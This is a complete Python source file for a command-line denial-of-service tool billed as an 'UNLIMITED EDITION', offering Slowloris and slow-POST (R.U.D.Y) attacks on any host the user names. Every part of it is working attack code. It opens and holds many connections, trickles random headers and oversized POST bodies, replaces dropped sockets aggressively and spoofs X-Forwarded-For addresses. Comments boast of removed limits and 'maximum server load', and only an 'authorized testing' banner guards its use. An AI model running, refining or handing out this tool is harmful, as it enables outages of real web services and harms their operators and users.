#!/usr/bin/env python3
"""
Slow HTTP Attack Agent - Standalone Version
Purpose: Educational and Authorized Penetration Testing Only

⚠️  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️
Unauthorized use against systems you don't own is ILLEGAL!
"""

import socket
import threading
import time
import sys
import random
import string
import signal
import argparse
from urllib.parse import urlparse

class SlowHTTPAttack:
    def __init__(self, host, port=80):
        self.host = host
        self.port = port
        self.conns = []
        self.running = False
        self.stats = {'sent': 0, 'errors': 0, 'active': 0}
        self.lock = threading.Lock()
    
    def create_socket(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(15)
            s.connect((self.host, self.port))
            return s
        except Exception as e:
            with self.lock:
                self.stats['errors'] += 1
            return None
    
    def slowloris_attack(self, num_conns=100, delay=15, duration=0):
        print(f"[SLOWLORIS] Starting attack on {self.host}:{self.port}")
        print(f"[CONFIG] Connections: {num_conns}, Delay: {delay}s, Duration: {'unlimited' if duration==0 else f'{duration}s'}")
        
        self.running = True
        start_time = time.time()
        
        # UNLIMITED: Aggressive connection creation - no artificial limits
        print("[PHASE1] Creating initial connections...")
        for i in range(num_conns):
            if not self.running:
                break
            
            sock = self.create_socket()
            if sock:
                try:
                    # Full HTTP request with multiple headers for maximum server load
                    request = f"GET /?slowloris={random.randint(100000,999999)}&cache={time.time()} HTTP/1.1\r\n"
                    request += f"Host: {self.host}\r\n"
                    request += f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n"
                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n"
                    request += "Accept-Language: en-US,en;q=0.9,es;q=0.8,fr;q=0.7\r\n"
                    request += "Accept-Encoding: gzip, deflate\r\n"
                    request += "Cache-Control: no-cache\r\n"
                    request += "Pragma: no-cache\r\n"
                    request += "Connection: keep-alive\r\n"
                    request += "Upgrade-Insecure-Requests: 1\r\n"
                    
                    sock.send(request.encode())
                    self.conns.append(sock)
                    
                    with self.lock:
                        self.stats['sent'] += 1
                    
                    if (i+1) % 100 == 0:
                        print(f"[PROGRESS] {i+1}/{num_conns} connections created")
                        
                except Exception as e:
                    with self.lock:
                        self.stats['errors'] += 1
                    try:
                        sock.close()
                    except:
                        pass
            
            # MINIMAL DELAY - Maximum connection rate
            if i % 100 == 0:
                time.sleep(0.01)  # Very small delay only every 100 connections
        
        with self.lock:
            self.stats['active'] = len(self.conns)
        print(f"[PHASE1] Complete. Active connections: {len(self.conns)}")
        
        if not self.conns:
            print("[ERROR] No connections established, aborting attack")
            return
        
        # Keep connections alive phase - AGGRESSIVE MODE
        print("[PHASE2] Starting aggressive keep-alive phase...")
        cycle_count = 0
        
        while self.running and self.conns:
            # Check duration limit
            if duration > 0 and (time.time() - start_time) >= duration:
                print("[DURATION] Time limit reached, stopping attack...")
                break
            
            cycle_count += 1
            active_before = len(self.conns)
            
            # Send multiple headers per connection for maximum server load
            failed_socks = []
            headers_per_cycle = random.randint(2, 5)  # Multiple headers per cycle
            
            for sock in self.conns:
                try:
                    # Send multiple headers to increase server load
                    for _ in range(headers_per_cycle):
                        header_name = ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(10,20)))
                        header_value = ''.join(random.choice(string.ascii_letters+string.digits+'-_.') for _ in range(random.randint(20,50)))
                        header = f"X-{header_name}: {header_value}\r\n"
                        
                        sock.send(header.encode())
                        with self.lock:
                            self.stats['sent'] += 1
                    
                except Exception:
                    failed_socks.append(sock)
                    with self.lock:
                        self.stats['errors'] += 1
            
            # Aggressive connection replacement - maintain connection count
            for sock in failed_socks:
                if sock in self.conns:
                    self.conns.remove(sock)
                try:
                    sock.close()
                except:
                    pass
                
                # AGGRESSIVE: Always try to replace lost connections
                replacement_attempts = 3  # Multiple attempts per failed connection
                for attempt in range(replacement_attempts):
                    new_sock = self.create_socket()
                    if new_sock:
                        try:
                            # Full request with randomization
                            req = f"GET /?session={random.randint(100000,999999)}&attempt={attempt} HTTP/1.1\r\n"
                            req += f"Host: {self.host}\r\n"
                            req += f"User-Agent: SlowHTTP-Agent-{random.randint(1000,9999)}\r\n"
                            req += "Connection: keep-alive\r\n"
                            req += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
                            
                            new_sock.send(req.encode())
                            self.conns.append(new_sock)
                            with self.lock:
                                self.stats['sent'] += 1
                            break  # Success, stop attempting
                        except Exception:
                            try:
                                new_sock.close()
                            except:
                                pass
            
            with self.lock:
                self.stats['active'] = len(self.conns)
                active_after = len(self.conns)
                sent = self.stats['sent']
                errors = self.stats['errors']
            
            print(f"[CYCLE {cycle_count}] Active: {active_after} | Headers sent: {sent} | Errors: {errors} | Replaced: {active_before-active_after if active_before > active_after else 0}")
            
            # VARIABLE DELAY for unpredictability
            sleep_time = random.uniform(delay * 0.5, delay * 1.5)
            time.sleep(sleep_time)
    
    def slow_post_attack(self, num_conns=50, delay=10, duration=0):
        print(f"[R.U.D.Y] Starting Slow POST attack on {self.host}:{self.port}")
        print(f"[CONFIG] Connections: {num_conns}, Delay: {delay}s, Duration: {'unlimited' if duration==0 else f'{duration}s'}")
        
        self.running = True
        start_time = time.time()
        
        def post_worker(worker_id):
            sock = self.create_socket()
            if not sock:
                print(f"[WORKER {worker_id}] Failed to connect")
                return
            
            try:
                # UNLIMITED: Large content-length for maximum effectiveness
                content_length = random.randint(10000000, 100000000)  # 10MB to 100MB range
                
                # Proper HTTP POST format
                post_request = f"POST /form{worker_id}?data=large HTTP/1.1\r\n"
                post_request += f"Host: {self.host}\r\n"
                post_request += "Content-Type: application/x-www-form-urlencoded\r\n"
                post_request += f"Content-Length: {content_length}\r\n"
                post_request += "Connection: keep-alive\r\n"
                post_request += "Expect: 100-continue\r\n"  # Forces server to wait
                post_request += "\r\n"  # End of headers
                
                sock.send(post_request.encode())
                with self.lock:
                    self.stats['sent'] += 1
                    
                print(f"[WORKER {worker_id}] POST headers sent, content-length: {content_length:,} bytes")
                
                # Send POST data extremely slowly - no artificial limits
                bytes_sent = 0
                chunk_sizes = [1,2,3,4,5,6,7,8,9,10,15,20]  # Variable chunk sizes
                
                while self.running and bytes_sent < content_length:
                    # Check duration limit
                    if duration > 0 and (time.time() - start_time) >= duration:
                        print(f"[WORKER {worker_id}] Duration limit reached")
                        break
                    
                    # Variable chunk size for unpredictability
                    chunk_size = random.choice(chunk_sizes)
                    remaining = min(chunk_size, content_length - bytes_sent)
                    
                    # Generate data chunk
                    data = ''.join(random.choice(string.ascii_letters+string.digits+'=&') for _ in range(remaining))
                    
                    try:
                        sock.send(data.encode())
                        bytes_sent += remaining
                        with self.lock:
                            self.stats['sent'] += remaining
                    except Exception:
                        print(f"[WORKER {worker_id}] Connection lost at {bytes_sent:,} bytes")
                        break
                    
                    # Progress report every 1MB
                    if bytes_sent % 1000000 == 0:
                        progress = (bytes_sent/content_length)*100
                        print(f"[WORKER {worker_id}] Progress: {bytes_sent:,}/{content_length:,} ({progress:.1f}%)")
                    
                    # SLOW TRANSMISSION - The core of R.U.D.Y
                    sleep_time = random.uniform(delay * 0.5, delay * 1.5)  # Variable delay
                    time.sleep(sleep_time)
                
                print(f"[WORKER {worker_id}] Completed: {bytes_sent:,} bytes sent")
                
            except Exception as e:
                print(f"[WORKER {worker_id}] Error: {str(e)}")
                with self.lock:
                    self.stats['errors'] += 1
            finally:
                try:
                    sock.close()
                except:
                    pass
        
        # NO THREAD LIMITS - Use all requested connections
        threads = []
        print(f"[THREADS] Starting {num_conns} R.U.D.Y worker threads...")
        
        # Start all worker threads
        for i in range(num_conns):
            if not self.running:
                break
            thread = threading.Thread(target=post_worker, args=(i+1,), daemon=True)
            thread.start()
            threads.append(thread)
            print(f"[THREAD {i+1}] Worker started")
            time.sleep(0.1)  # Small stagger to avoid overwhelming
        
        # Monitor all threads
        while self.running:
            if duration > 0 and (time.time() - start_time) >= duration:
                print("[DURATION] Time limit reached, stopping...")
                self.running = False
                break
            
            # Count active threads
            active_threads = sum(1 for t in threads if t.is_alive())
            
            with self.lock:
                sent = self.stats['sent']
                errors = self.stats['errors']
            
            print(f"[R.U.D.Y STATUS] Active workers: {active_threads}/{num_conns} | Total bytes sent: {sent:,} | Errors: {errors}")
            
            if active_threads == 0:
                print("[R.U.D.Y] All workers completed")
                break
            
            time.sleep(10)  # Status update interval
    
    def stop_attack(self):
        print("[STOP] Stopping attack...")
        self.running = False
        
        # Close all connections
        for sock in self.conns[:]:
            try:
                sock.close()
            except:
                pass
        self.conns.clear()
        print("[STOP] Attack stopped")

# Better signal handling
attacker = None

def signal_handler(sig, frame):
    global attacker
    print("\n[SIGNAL] Received interrupt signal")
    if attacker:
        attacker.stop_attack()
    print("[EXIT] Shutting down...")
    sys.exit(0)

def main():
    global attacker
    
    parser = argparse.ArgumentParser(description='Slow HTTP Attack Agent - UNLIMITED EDITION')
    parser.add_argument('target', help='Target URL or hostname')
    parser.add_argument('attack_type', choices=['slowloris','slow_post'], help='Type of attack to perform')
    parser.add_argument('--connections', '-c', type=int, default=100, help='Number of connections (default: 100, no upper limit)')
    parser.add_argument('--delay', '-d', type=int, default=15, help='Delay between packets in seconds (default: 15, can be 0)')
    parser.add_argument('--duration', '-t', type=int, default=0, help='Attack duration in seconds (0=unlimited, default: 0)')
    
    args = parser.parse_args()
    
    # Validate arguments - REMOVED ARTIFICIAL LIMITS
    if args.connections < 1:
        print("ERROR: Connections must be at least 1")
        sys.exit(1)
    
    if args.delay < 0:
        print("ERROR: Delay cannot be negative")
        sys.exit(1)
    
    # Warning for very high connection counts
    if args.connections > 10000:
        print(f"WARNING: Very high connection count ({args.connections:,})")
        print("This may overwhelm your system or network. Continue? (y/N)")
        if input().strip().lower() != 'y':
            sys.exit(1)
    
    # Parse target
    if args.target.startswith('http://') or args.target.startswith('https://'):
        parsed = urlparse(args.target)
        target_host = parsed.hostname
        target_port = parsed.port or (443 if parsed.scheme=='https' else 80)
    else:
        target_host = args.target.split(':')[0]
        if ':' in args.target:
            try:
                target_port = int(args.target.split(':')[1])
            except ValueError:
                target_port = 80
        else:
            target_port = 80
    
    print("="*80)
    print("SLOW HTTP ATTACK AGENT - UNLIMITED EDITION")
    print("="*80)
    print(f"Target: {target_host}:{target_port}")
    print(f"Attack: {args.attack_type.upper()}")
    print(f"Connections: {args.connections:,}")
    print(f"Delay: {args.delay}s")
    print(f"Duration: {'Unlimited' if args.duration==0 else f'{args.duration}s'}")
    print("="*80)
    print("WARNING: FOR AUTHORIZED TESTING ONLY!")
    print("="*80)
    
    # Set up signal handlers
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Create attacker instance
    attacker = SlowHTTPAttack(target_host, target_port)
    
    try:
        if args.attack_type == "slowloris":
            attacker.slowloris_attack(args.connections, args.delay, args.duration)
        elif args.attack_type == "slow_post":
            attacker.slow_post_attack(args.connections, args.delay, args.duration)
    except KeyboardInterrupt:
        print("\n[INTERRUPTED] Stopping attack...")
        attacker.stop_attack()
    except Exception as e:
        print(f"[ERROR] {str(e)}")
        attacker.stop_attack()
    finally:
        print("[CLEANUP] Attack completed")

if __name__ == "__main__":
    main()
